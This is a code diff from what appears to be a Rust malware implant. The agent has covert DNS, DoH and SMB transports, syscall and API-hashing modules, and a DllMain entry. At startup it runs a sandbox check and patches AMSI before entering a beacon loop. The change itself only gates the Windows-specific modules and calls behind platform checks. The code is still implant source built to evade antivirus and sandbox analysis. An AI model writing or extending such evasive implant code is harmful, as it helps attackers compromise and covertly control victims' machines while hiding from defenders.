@@ -9,15 +9,22 @@ mod crypto;
 mod transport;
 mod transport_dns;
 mod transport_doh;
+#[cfg(target_os = "windows")]
 mod transport_smb;
+#[cfg(target_os = "windows")]
 mod hells_gate;
+#[cfg(target_os = "windows")]
 mod api_hash;
 mod commands;
+#[cfg(target_os = "windows")]
 mod evasion;
+#[cfg(target_os = "windows")]
 mod dotnet;
 
+#[cfg(target_os = "windows")]
 use std::os::raw::c_void;
 
+#[cfg(target_os = "windows")]
 #[no_mangle]
 pub extern "system" fn DllMain(
     _hinst: *mut c_void,
@@ -34,10 +41,15 @@ pub extern "system" fn DllMain(
 fn agent_main() {
     use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};
     use std::sync::atomic::Ordering;
-    hells_gate::init();
-    api_hash::init();
-    evasion::sandbox_check();
-    evasion::patch_amsi();
+
+    #[cfg(target_os = "windows")]
+    {
+        hells_gate::init();
+        api_hash::init();
+        evasion::sandbox_check();
+        evasion::patch_amsi();
+    }
+
     let mut t = transport::AgentTransport::new();
     loop {
         t.register();
